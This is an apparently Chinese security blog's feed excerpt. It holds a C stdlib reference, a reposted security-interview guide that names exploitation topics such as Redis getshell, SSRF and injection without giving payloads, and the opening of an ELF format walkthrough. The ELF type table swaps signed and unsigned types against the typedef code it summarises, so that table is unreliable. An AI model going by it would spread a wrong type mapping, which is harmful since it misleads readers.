c（一个无符号字符）到参数 <em>str</em> 所指向的字符串的前 n 个字符，返回str。</td></tr></tbody></table><h4 id="3功能函数stdlibh"><a class="markdownIt-Anchor" href="#3功能函数stdlibh"></a> 3.功能函数（&lt;stdlib.h&gt;）</h4><p><code>动态存储分配函数</code></p><table><thead><tr><th>函数原型</th><th>意义解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-calloc.html" target="_blank" rel="noopener">void *calloc(size_t nitems, size_t size)</a></td><td>分配一块存储，其中足以存放n个大小为size的对象，并将所有字节用0字符填充。<br>返回该存储块的地址。不能满足时返回NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-malloc.html" target="_blank" rel="noopener">void *malloc(size_t size)</a></td><td>分配一块足以存放大小为size的存储，返回该存储块的地址，不能满足时返回NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-realloc.html" target="_blank" rel="noopener">void *realloc(void *ptr, size_t size)</a></td><td>将ptr所指存储块调整为大小size，返回新块的地址。<br>如能满足要求，新块的内容与原块一致；不能满足要求时返回NULL，此时原块不变</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-free.html" target="_blank" rel="noopener">void free(void *ptr)</a></td><td>释放之前调用 <em>calloc、malloc</em> 或 <em>realloc</em> 所分配的内存空间。</td></tr></tbody></table><p><code>随机数函数</code></p><table><thead><tr><th>函数原型</th><th>意义解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-rand.html" target="_blank" rel="noopener">int rand(void)</a></td><td>返回一个范围在 0 到 <em>RAND_MAX</em> 之间的伪随机数。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-srand.html" target="_blank" rel="noopener"> void srand(unsigned int seed)</a></td><td>该函数播种由函数 <strong>rand</strong> 使用的随机数发生器。</td></tr></tbody></table><p><code>数值转换函数</code></p><table><thead><tr><th>函数原型</th><th>意义解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-atof.html" target="_blank" rel="noopener">double atof(const char *str)</a></td><td>把参数 <em>str</em> 所指向的字符串转换为一个浮点数（类型为 double 型）</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-atoi.html" target="_blank" rel="noopener">int atoi(const char *str)</a></td><td>把参数 <em>str</em> 所指向的字符串转换为一个整数（类型为 int 型）</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-atol.html" target="_blank" rel="noopener"> long int atol(const char *str)</a></td><td>把参数 <em>str</em> 所指向的字符串转换为一个长整数（类型为 long int 型）</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-常见的标准头&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-常见的标准头&quot;&gt;&lt;/a&gt; 0x00 常见的标准头&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.runoob.c
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【转载】Security Interview Questions</title>
    <link href="https://muzibing.github.io/2020/09/13/2020.09.13%EF%BC%88151%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/13/2020.09.13（151）/</id>
    <published>2020-09-12T16:00:00.000Z</published>
    <updated>2020-09-13T03:25:17.515Z</updated>
    
    <content type="html"><![CDATA[<p>网络信息安全从业者面试指南</p><blockquote><p>传送门：<a href="https://github.com/FeeiCN/SecurityInterviewQuestions" target="_blank" rel="noopener">Security Interview Questions</a></p></blockquote><h2 id="1-安全招聘现状"><a class="markdownIt-Anchor" href="#1-安全招聘现状"></a> 1 安全招聘现状</h2><h3 id="11-薪酬最高"><a class="markdownIt-Anchor" href="#11-薪酬最高"></a> 1.1 薪酬最高</h3><p>互联网是计算机行业中薪酬最高的，而技术工程师是互联网中薪酬最高的，而安全工程师又是技术工程师中最高的。安全行业井喷式的爆发，使得每家互联网企业的安全部门成为标配并逐渐蔓延开来，而由于高校的安全专业才开始普及，安全从业人员紧缺且入门门槛较高从而导致了薪酬水涨船高。</p><h3 id="12-良莠不齐"><a class="markdownIt-Anchor" href="#12-良莠不齐"></a> 1.2 良莠不齐</h3><p>好处是会有更多的人投身于安全，当然坏处也很明显，着急的岗位和紧缺人员导致存在大量良莠不齐的人在其中浑水摸鱼，明显的特征是你跟他聊技术细节他跟你聊推进落地，你跟他聊推进落地他跟你聊方向把控，你跟他聊方向把控他跟你聊团队管理，你跟他聊团队管理他跟你聊行业空间，如果这些方面都能聊一点那也行，更多的人是<strong>答非所问</strong>又或者<strong>句句有理但空洞没有屁用</strong>，又或者是今天这里听到一个理论还没弄明白呢明天就来跟你拽个概念，虽然这么说会得罪一部分人。</p><h3 id="13-圈子文化"><a class="markdownIt-Anchor" href="#13-圈子文化"></a> 1.3 圈子文化</h3><p>安全是一个小圈子，圈内的事情传播的非常快，比如谁家数据库泄露了、谁家被薅羊毛了、谁被抓了、谁被处罚了，这也是小圈子最大的好处，圈内的人很快能知道这个行业的新技术、新方向、新政策。你也可以很容易的知道每家公司的安全建设情况，比如你可以和阿里的人聊他们的线下配合公安的手段有多强，也可以和腾讯的人聊他们的SRC如何运营的这么好，也可以和百度的安全人聊如何让机器学习赋能安全产品的，这一切在安全圈内非常的容易。也有很多的安全会议可以学习到每家公司的经验，不用所有的事情都自己摸索也用闭门造车。</p><p>弊端也很明显，搞所谓的”圈子文化“，混迹于各种会议去主动认识各种圈内的人（当然这里不是指各家SRC运营的同学，这些是运营同学的工作一部分），认识的各种人如果是交流技术那也行，加了微信除了打招呼的自我介绍那句话就再也没说过有意义的东西，以为这样就进入了圈中心，可笑可悲。</p><h2 id="2-安全从业人员的必要素质"><a class="markdownIt-Anchor" href="#2-安全从业人员的必要素质"></a> 2 安全从业人员的必要素质</h2><blockquote><p>具备基础的工程师素质是一切的基础，在这个基础之上如果在攻防渗透和软件开发、兴趣驱动和适应能力上比较亮眼，则能很好的适应工作挑战。</p></blockquote><h3 id="21-攻防渗透和软件开发"><a class="markdownIt-Anchor" href="#21-攻防渗透和软件开发"></a> 2.1 攻防渗透和软件开发</h3><p>首先要明确一个概念，术业有专攻在安全行业不是常态。安全本身就是一个覆盖了客户端、前端、网络、后端、服务器等涉及JavaScript、Python、PHP、Java等各语言的工作，如果非要讲究术业有专攻就没法做了，当你可以有擅长的方向，但前提是你都懂，这个懂不应该停留在了解的层面，如果你是安全开发工程师除了研发技能外还必须知道常见漏洞的形成原因、利用方式和修复方案，如果你是渗透工程师除了理解各种漏洞的攻击细节外，还必须有基本的开发能力。</p><p>同时拥有攻防渗透和软件开发的人，在后面做事的方方面面会体现出极大的优势。</p><p>我们有过很资深研发工程师，但安全产品不同于用户产品，往往是都没有经验也没有参照物的，摸黑前行最好的情况是你曾住过这个房子，所以往往需要有很强的安全背景/不断的试错调整才能开发最好的产品。甚至在很多时候，沟通交流/思维上都需要进行转变才能更好的协作，减少代沟和沟通成本。这个要求并不是非要精通各种。</p><p>现状是安全行业更多的人是偏向于攻防渗透，而如果同时拥有很强的开发技能，优势将非常明显。在安全产品开发/漏洞挖掘/代码审计上。</p><p>不同岗位间的互补显得非常重要，做漏洞扫描器的如果在SRC挖过漏洞、做代码审计如果会软件开发、做合规审计的如果有CISP证书就会得心应手。</p><h3 id="22-兴趣驱动"><a class="markdownIt-Anchor" href="#22-兴趣驱动"></a> 2.2 兴趣驱动</h3><p>像安全产品开发一样，渗透测试也需要不断的试错，不断的将各种可能存在漏洞的地方一一测试，往往测试数百个请求才有所收获，这需要很好的坚持，但坚持这种品质无法立刻学会，但往往有很多东西能促使我们坚持，比如兴趣。我对于安全的坚持就是兴趣所驱动的，我会遇到一个线索从早上折腾到凌晨，会因为一个突破点从晚上摸索到下午。 我见过太多优秀的白帽子都是因为热爱，他们能跨行业的热爱。</p><h3 id="23-适应能力"><a class="markdownIt-Anchor" href="#23-适应能力"></a> 2.3 适应能力</h3><p>软件工程师是三年换一轮新技术，而安全工程师则是每年都有新的方向。每天都会有新的漏洞/新的攻击方式/新的语言漏洞，每年也会有新的安全技术、安全防御手段、安全方向，而应对别无他法唯学习，良好的自驱自学能力是一切的基础。</p><h2 id="3-安全面试和笔试"><a class="markdownIt-Anchor" href="#3-安全面试和笔试"></a> 3 安全面试和笔试</h2><blockquote><p>如何有效的甄别一些滥竽充数的人，最重要的肯定是面试这道坎。安全圈的东西行业内的人谁都能聊一点，所以一轮面试一定得安全技术负责人亲自把关，深入的问细节来判断。</p></blockquote><h3 id="31-面试注意项"><a class="markdownIt-Anchor" href="#31-面试注意项"></a> 3.1 面试注意项</h3><ul><li>提前约好面试时间和面试方式（电话/现场）</li><li>准时参与面试，有事情应提前电话沟通到位</li><li>面试时把握好节奏，及时阻止话多的，多留停顿给话少的</li><li>面试时不问/不透露公司敏感信息</li><li>即使只聊一分钟就觉得面试者不合适，也不应该立即挂断，面试应不少于20分钟</li></ul><h3 id="32-面试流程"><a class="markdownIt-Anchor" href="#32-面试流程"></a> 3.2 面试流程</h3><ul><li>自我介绍下个人情况、做过的项目和技能<ul><li>观察谈吐，看思维逻辑是否有条理，沟通交流是否顺畅</li><li>性格类型是否合适</li></ul></li><li>围绕做过的项目进行细节提问，提问的问题根据岗位不同可以从3.2中抽取<ul><li>考察项目真实性、项目角色及分工</li><li>对项目的理解程度、掌握程度、思考等</li></ul></li><li>遇到解决不了的问题怎么做？<ul><li>考察学习能力和动手解决能力</li></ul></li><li>CTF、乌云、翻墙、写技术博客、技术书籍、参与GitHub开源项目、常浏览的网站、游戏、电视剧、业余时间干嘛、业内牛人<ul><li>综合体现出其技术热度</li></ul></li><li>算法、前端、服务器的掌握程度<ul><li>一些基础算法，比如快速排序、冒泡排序、选择排序、插入排序</li><li>一些机器学习算法，CNN、RNN、Tensorflow、验证码识别等等</li><li>前端JavaScript、HTML、CSS掌握程度，调试工具，编码等</li><li>服务器常用命令、配置、文件权限、进程栈、端口占用、异常日志等</li></ul></li><li>自认为自己比身边人的优势<ul><li>挖掘亮点，如何客观看待自己</li></ul></li><li>自认为的缺点<ul><li>客观的自我评价，讲自己没有缺点的基本可以不要了</li></ul></li><li>最有成就感的事情<ul><li>考察价值观，尤其对于一些未授权渗透甚至黑灰产事情的态度</li></ul></li><li>未来职业规划？<ul><li>请否有清晰的职业规划，对自己未来有长远思考</li><li>和当前岗位对匹配度</li></ul></li><li>还有什么要问我的吗？<ul><li>了解面试者所关心的侧重点</li></ul></li></ul><h3 id="33-面试题目"><a class="markdownIt-Anchor" href="#33-面试题目"></a> 3.3 面试题目</h3><h4 id="渗透测试web方向"><a class="markdownIt-Anchor" href="#渗透测试web方向"></a> 渗透测试（Web方向）</h4><ul><li>挑选两到四个不同方向常见和不常见的漏洞，就漏洞原理、利用方式和修复方案进行提问，然后根据回答的情况进行详细深入的二次提问<ul><li>Redis未授权访问漏洞如何入侵利用？</li><li>SSRF漏洞原理、利用方式及修复方案？Java和PHP的SSRF区别？</li><li>宽字节注入漏洞原理、利用方式及修复方案？</li><li>简述JSONP的业务意义，JSONP劫持利用方式及修复方案？</li><li>CRLF注入原理？</li><li>URL白名单绕过？</li><li>XSS持久化？</li></ul></li><li>渗透全流程</li><li>就漏洞的检测发现进行提问<ul><li>越权问题如何检测？</li><li>黑盒如何检测XSS漏洞？</li><li>如果爬取更多的请求？</li></ul></li><li>应急思考<ul><li>有哪几种后门实现方式？</li><li>webshell检测有什么方法思路？</li><li>Linux服务器中了木马后，请简述应急思路？</li><li>遇到新0day(比如Struts2)后，应该如何进行应急响应？</li><li>新业务上线前可以从哪些方向进行安全评估？</li><li>现有系统可以从哪些方向进行审计发现其中的安全风险？</li></ul></li><li>基础开发<ul><li>简述Python装饰器、迭代器、生成器原理及应用场景？</li><li>简述Python进程、线程和协程的区别及应用场景？</li></ul></li></ul><h4 id="安全开发java方向"><a class="markdownIt-Anchor" href="#安全开发java方向"></a> 安全开发（Java方向）</h4><ul><li>Java基础<ul><li>Java虚拟机区域如何划分？</li><li>HashMap和HashTable、ConcurrentHashMap的区别？</li><li>进程和线程区别，进程间、线程间通信有哪几种方式？</li><li>Java BIO/NIO/AIO是什么？适用哪些场景？</li></ul></li><li>算法基础<ul><li>快速排序的过程和复杂度？</li><li>冒泡排序的过程和复杂度？</li><li>CNN对比RNN区别？</li></ul></li><li>业务基础<ul><li>调试工具及异常排查流程？</li><li>数据库索引结构，什么情况下应该建唯一索引？</li><li>数据库分页语句如何写？</li></ul></li><li>业务安全<ul><li>HTTPS交互过程</li><li>OAuth2.0交互过程及其中可能存在的配置不当安全风险</li><li>对称加密和非对称加密的区别及优缺点</li><li>获取一个入参url，请求url地址的内容时应注意什么？</li><li>参数入库前应该如何过滤？</li><li>过滤器和拦截器原理和应用场景？</li><li>SESSION ID如何不被Javascript读取？</li><li>CSRF的Token如何设计？</li><li>同源策略？如何实现跨域请求？</li></ul></li></ul><h4 id="安全运营合规审计方向"><a class="markdownIt-Anchor" href="#安全运营合规审计方向"></a> 安全运营（合规审计方向）</h4><ul><li>对于内控、合规、审计的理解<ul><li>考察其对于要做的事情和岗位要求、公司环境是否匹配</li><li>考察其大局上考虑是否周全或是片面</li></ul></li><li>传统行业和互联网行业的安全建设的区别及各自的优劣势<ul><li>是否能准确的抓住核心原因</li></ul></li><li>信息安全等级保护、网络安全法、GDPR<ul><li>挑选一到两个问其对其的来源理解以及落地程度取舍</li></ul></li><li>数据安全治理可以用什么思路做？</li><li>如何通过技术手段实现对异常操作的自动化监控？</li><li>如何对一个应用进行安全评估？</li><li>如何对一个应用进行安全审计？</li><li>如何理解权限分离、最小化权限？</li><li>考察一些CISP、CISSP的知识点</li><li>流程的设计<ul><li>挑选一些较为复杂的流程，比如转岗、离职等，如何设计考虑其中的细节</li></ul></li></ul><h4 id="安全架构安全管理方向"><a class="markdownIt-Anchor" href="#安全架构安全管理方向"></a> 安全架构（安全管理方向）</h4><ul><li>渗透测试、安全研发、安全运营的问题可以挑选的问一些，以确保在各个方向上比较均衡</li><li>对于企业不同时期、不同阶段、不同体量的安全建设的方法、区别以及侧重</li><li>你所做过的安全架构图和所期望的安全架构</li><li>安全与其他团队（运维、研发、测试、GR/PR、内控、高管及三方安全公司）的关系</li><li>安全建设的理念/方法论理解<ul><li>纵深防御</li><li>木桶原理</li><li>由外而内</li><li>先低后上</li><li>能口不点</li><li>最小权限</li><li>权限分离</li><li>白名单和黑名单</li><li>漏洞和误报</li><li>规则经验和机器学习</li><li>漏洞危害证明</li><li>技术管控与意识提升的关系</li><li>安全推进方法</li><li>自研OR外采？</li><li>找到总的核心目标和各个项目的主要目标</li><li>创新和极致</li><li>责任分担</li><li>黑天鹅和灰犀牛</li></ul></li><li>衡量企业安全建设的水平</li><li>不同公司间的安全区别或差别是什么？比如腾讯和阿里，百度和京东</li><li>如何制定公司安全建设的三年甚至五年计划</li><li>未来安全行业的发展方向？</li></ul><h3 id="34-笔试题目"><a class="markdownIt-Anchor" href="#34-笔试题目"></a> 3.4 笔试题目</h3><blockquote><p>面试题目往往大同小异，而由于圈子小的原因很容易传播出去，如果做过准备哪怕深入的问也可能有漏网之鱼。而笔试往往能很好的看出来其动手能力，所以应尽可能的出一些无法提前预知、无法网上查询的专属题目，题目可以侧重于开发、调试、数据操作等方面。</p></blockquote><h4 id="渗透测试方向"><a class="markdownIt-Anchor" href="#渗透测试方向"></a> 渗透测试方向</h4><ul><li>给定一个漏洞靶场，在一定时间内找出最多漏洞数</li><li>给定一个匿名访问Redis，请GET SHELL</li><li>给一个项目场景进行安全评估（e.g.与三方厂商进行API交互）</li></ul><h4 id="软件开发方向"><a class="markdownIt-Anchor" href="#软件开发方向"></a> 软件开发方向</h4><ul><li>读取一个文件第100-200行并发送到一个指定的API接口（着重考察对于各种异常情况的考虑）</li><li>最快的方式获取100万个子域名请求的响应内容并找出其中真实存在的子域名</li></ul><h4 id="数据结构方向"><a class="markdownIt-Anchor" href="#数据结构方向"></a> 数据结构方向</h4><ul><li>给一个数组<code>[3,4,5,6,2,1,8]</code>，输入所有二元组其和为8。<ul><li>每个数字只能用一次</li><li>数组长度不定</li><li>考虑时间复杂度和空间复杂度，以最高效率</li></ul></li><li>存在一个list结构（表1），请转换为树状结构（表2）<ul><li>pid和id关系为父子关系</li><li>name为无规律随意命名</li></ul></li></ul><p>表1：list结构（list length&gt;1000）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'111'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'0'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'222'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'223'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B2'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'224'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B3'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'333'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'223'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B2-C1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'444'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'333'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B2-C1-D1'</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>表2：最终的结构</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">'id'</span>: <span class="string">'111'</span>,</span><br><span class="line">  <span class="string">'pid'</span>: <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'name'</span>: <span class="string">'A1'</span>,</span><br><span class="line">  <span class="string">'child'</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">'222'</span>,</span><br><span class="line">      <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">      <span class="string">'name'</span>: <span class="string">'A-B1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">'223'</span>,</span><br><span class="line">      <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">      <span class="string">'name'</span>: <span class="string">'A-B2'</span>,</span><br><span class="line">      <span class="string">'child'</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">'id'</span>: <span class="string">'333'</span>,</span><br><span class="line">          <span class="string">'pid'</span>: <span class="string">'223'</span>,</span><br><span class="line">          <span class="string">'name'</span>: <span class="string">'A-B2-C1'</span>,</span><br><span class="line">          <span class="string">'child'</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="string">'id'</span>: <span class="string">'444'</span>,</span><br><span class="line">              <span class="string">'pid'</span>: <span class="string">'333'</span>,</span><br><span class="line">              <span class="string">'name'</span>: <span class="string">'A-B2-C1-D1'</span></span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">'224'</span>,</span><br><span class="line">      <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">      <span class="string">'name'</span>: <span class="string">'A-B3'</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-招聘渠道"><a class="markdownIt-Anchor" href="#4-招聘渠道"></a> 4 招聘渠道</h2><h3 id="41-公司内部推荐"><a class="markdownIt-Anchor" href="#41-公司内部推荐"></a> 4.1 公司内部推荐</h3><blockquote><p>内推是优于招聘网站或猎头的，和找女朋友一样，熟人介绍的比媒婆介绍的要好，更不用说相亲网站的质量了。对于中高端岗位公司需要支付较高的猎头费用，所以内推渠道优于其它所有。</p></blockquote><ul><li>找到自己倾向的公司以及对应的招聘岗位<ul><li>注意岗位和个人技能及职业发展的匹配度</li></ul></li><li>找到对应公司员工请求内部推荐简历<ul><li>优先安全岗位的，其次同公司的</li><li>优先熟悉自己的，其次自检写好</li></ul></li></ul><h3 id="42-安全行业招聘网站"><a class="markdownIt-Anchor" href="#42-安全行业招聘网站"></a> 4.2 安全行业招聘网站</h3><blockquote><p>没有合适心仪的目标就上招聘网站。</p></blockquote><ul><li><a href="https://job.freebuf.com" target="_blank" rel="noopener">FreeBuf</a> - 安全行业垂直招聘网站</li><li><a href="https://www.lagou.com/zhaopin/wangluoanquan/" target="_blank" rel="noopener">拉钩</a> - 互联网垂直招聘</li><li><a href="https://www.zhipin.com/c101210100-p100407/" target="_blank" rel="noopener">BOSS直聘</a> - 负责人1对1</li><li><a href="https://www.liepin.com/zpwangluoanquan/" target="_blank" rel="noopener">猎聘</a> - 猎头招聘</li><li>智联招聘、前程无忧、LinkedIn</li></ul><h2 id="5-好的简历"><a class="markdownIt-Anchor" href="#5-好的简历"></a> 5 好的简历</h2><blockquote><p>顺便说下好的简历是什么样的，当然一切的前提是有真才实干。</p></blockquote><p>整体要简洁明了，逻辑结构清晰。要能体现出知识、技能、经历、天赋、人脉。</p><ul><li>基本信息<strong>清晰</strong>：姓名、ID、性别、年龄、毕业院校·专业、电话、邮箱、居住地</li><li>工作&amp;项目经验：注意空档期、担任的角色与分工、公司行业知名度</li><li><strong>体现</strong>技术能力：主要的技术栈以及能佐证的事情</li><li>其它<strong>优势</strong>：职业证书、奖项、会议分享、开源项目等</li><li>工作期望和方向：希望得到一个什么样的工作或自己专注的方向</li><li>个人评价：全方位的总结，展示出自己的专业技能掌握程度、亮点、优势等等。</li><li>加分项<ul><li>使用PDF格式，简洁不花哨</li><li>有GitHub并参与过开源项目，可以写一些自己做过的小项目放上去</li><li>有个人博客，会写一些经验和问题的解决思路</li><li>邮箱使用gmail、foxmail或技术类邮箱（<a href="http://php.net" target="_blank" rel="noopener">php.net</a>）、私人域名邮箱等</li></ul></li><li>询问面试官对于自己的评价和可以改进的地方</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;网络信息安全从业者面试指南&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;传送门：&lt;a href=&quot;https://github.com/FeeiCN/SecurityInterviewQuestions&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Secur
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>ELF文件格式实例解析</title>
    <link href="https://muzibing.github.io/2020/09/07/2020.09.07%EF%BC%88150%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/07/2020.09.07（150）/</id>
    <published>2020-09-06T16:00:00.000Z</published>
    <updated>2020-09-10T05:27:28.810Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-知识储备"><a href="#0x00-知识储备" class="headerlink" title="0x00 知识储备"></a><font color="navy">0x00 知识储备</font></h2><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><blockquote><p>接触过Linux文件的朋友应该都很清楚ELF文件，它和windows上的PE文件都是在COFF文件的基础上发展而来，一般在逆向或者说二进制安全方面都会了解其一些相关结构知识，但是由于其入门难、信息量大的原因，导致很多人（当然包括我）在看过很多遍书以后遗忘的速度仍然很快，今天我们就一起通过其源码来对ELF做个深入的了解和剖析。</p></blockquote><h3 id="2-预定义类型"><a href="#2-预定义类型" class="headerlink" title="2.预定义类型"></a>2.预定义类型</h3><blockquote><p>其结构源码被包含在<code>/usr/include/elf.h</code>文件中</p></blockquote><font size="2">首先来看一下预定义的类型</font><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type for a 16-bit quantity.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf32_Half;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf64_Half;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Types for signed and unsigned 32-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  Elf32_Sword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf64_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  Elf64_Sword;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type of addresses.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type of file offsets.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Off;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Off;</span><br></pre></td></tr></table></figure><blockquote><font size="2">将上述被定义的类型总结为：</font></blockquote><div class="table-container"><table><thead><tr><th>自定义类型</th><th>描述</th><th>原始类型</th><th>长度</th></tr></thead><tbody><tr><td>ELF32_Addr</td><td>32位版本程序地址</td><td>uint32_t</td><td>4</td></tr><tr><td>ELF32_Half</td><td>32位版本的无符号短整型</td><td>uint16_t</td><td>2</td></tr><tr><td>ELF32_Off</td><td>32位版本的偏移地址</td><td>uint32_t</td><td>4</td></tr><tr><td>ELF32_Sword</td><td>32位版本有符号整型</td><td>uint32_t</td><td>4</td></tr><tr><td>ELF32_Word</td><td>32位版本无符号整型</td><td>int32_t</td><td>4</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td>ELF64_Addr</td><td>64位版本程序地址</td><td>uint64_t</td><td>8</td></tr><tr><td>ELF64_Half</td><td>64位版本的无符号短整型</td><td>uint16_t</td><td>2</td></tr><tr><td>ELF64_Off</td><td>64位版本的偏移地址</td><td>uint64_t</td><td>8</td></tr><tr><td>ELF64_Sword</td><td>64位版本有符号整型</td><td>uint32_t</td><td>4</td></tr><tr><td>ELF64_Word</td><td>64位版本无符号整型</td><td>int32_t</td><td>4</td></tr></tbody></table></div><h3 id="3-ELF文件结构"><a href="#3-ELF文件结构" class="headerlink" title="3.ELF文件结构"></a>3.ELF文件结构</h3><p><img src="/images/150-1.png" alt></p><blockquote><p>图来自<a href="http://chuquan.me/2018/05/21/elf-introduce/" target="_blank" rel="noopener">计算机那些事(4)——ELF文件结构| 楚权的世界</a></p></blockquote><font 